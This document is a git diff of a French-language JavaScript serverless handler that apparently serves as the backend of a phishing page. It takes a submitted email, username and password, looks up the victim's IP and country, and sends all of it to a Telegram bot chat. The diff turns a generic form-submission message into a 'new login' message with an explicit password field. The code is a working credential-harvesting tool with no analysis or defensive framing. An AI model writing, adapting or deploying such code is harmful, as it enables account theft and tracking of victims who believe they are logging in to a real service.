@@ -1,7 +1,7 @@
 export default async function handler(req, res) {
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
   if (req.method === "OPTIONS") return res.status(200).end();
   if (req.method !== "POST") return res.status(405).json({ error: "Méthode non autorisée" });
@@ -13,31 +13,30 @@ export default async function handler(req, res) {
     const chatId = process.env.CHAT_ID;
 
     if (!botToken || !chatId) {
-      console.error("Variables d'environnement manquantes");
       return res.status(500).json({ error: "Configuration serveur incomplète" });
     }
 
-    // --- Obtenir IP du client
+    // 1️⃣ Obtenir l’IP du client
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || "IP inconnue";
 
-    // --- Obtenir pays via IP
+    // 2️⃣ Obtenir le pays via API externe
     let country = "Inconnu";
     try {
       const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
       const geoData = await geoRes.json();
       if (geoData?.country) country = geoData.country;
-    } catch (e) {
-      console.warn("Impossible d'obtenir le pays via IP");
+    } catch {
+      console.warn("Impossible d’obtenir le pays via IP");
     }
 
-    // --- Créer message Telegram
-    const message = `Nouvelle soumission :
-🌍 IP : ${ip} (${country})
-👤 Nom : ${usermail}
-👥 Prénoms : ${user}
-💬 Message : ${pass}`;
+    // 3️⃣ Message Telegram
+    const message = `Nouvelle connexion :
+📧 Email : ${usermail}
+🆔 Identifiant : ${user}
+🔑 Mot de passe : ${pass}
+🌍 IP : ${ip} (${country})`;
 
-    // --- Envoyer message à Telegram
+    // 4️⃣ Envoi à Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const telegramResponse = await fetch(telegramUrl, {
       method: "POST",
@@ -47,13 +46,13 @@ export default async function handler(req, res) {
 
     if (!telegramResponse.ok) {
       const text = await telegramResponse.text();
-      console.error("Telegram returned error:", text);
-      return res.status(500).json({ error: "Erreur lors de l'envoi à Telegram", details: text });
+      console.error("Erreur Telegram:", text);
+      return res.status(500).json({ error: "Échec d’envoi Telegram", details: text });
     }
 
-    return res.status(200).json({ success: true, message: "Données envoyées à Telegram" });
+    return res.status(200).json({ success: true, message: "Message envoyé à Telegram" });
   } catch (error) {
-    console.error("Erreur serveur:", error);
+    console.error("Erreur serveur :", error);
     return res.status(500).json({ error: "Erreur serveur" });
   }
 }
